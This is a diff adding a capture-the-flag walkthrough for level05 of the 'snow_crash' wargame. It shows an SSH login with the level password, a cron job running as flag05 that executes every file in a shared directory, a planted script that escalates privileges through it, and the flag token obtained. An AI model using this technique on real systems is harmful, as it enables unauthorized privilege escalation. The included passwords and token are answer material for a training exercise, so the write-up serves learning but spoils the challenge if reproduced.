@@ -1,0 +1,29 @@
+Level05 - snow_crash
+
+Connect with the previous password "ne2searoevaevoem4ov4ar8ap"
+	ssh -p 4242 level05@192.168.1.20 
+
+When going inside we receive this "You have new mail."
+You can do "/var/mail/level05" to see the mail
+
+	"*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05" 
+
+It a cron job that launch the program openarenaserver every two minute
+The file openarenaserver have this script 
+
+	#!/bin/sh
+
+	for i in /opt/openarenaserver/* ; do
+		(ulimit -t 5; bash -x "$i")
+		rm -f "$i"
+	done
+
+It launch every program in the folder /opt/openarenaserver
+
+so we going to put a little script inside, here the script 
+
+	#!/bin/bash
+	getflag > /tmp/flag
+do "watch -d ls -l" after some time the file will disapear and you can "cat /tmp/flag"
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
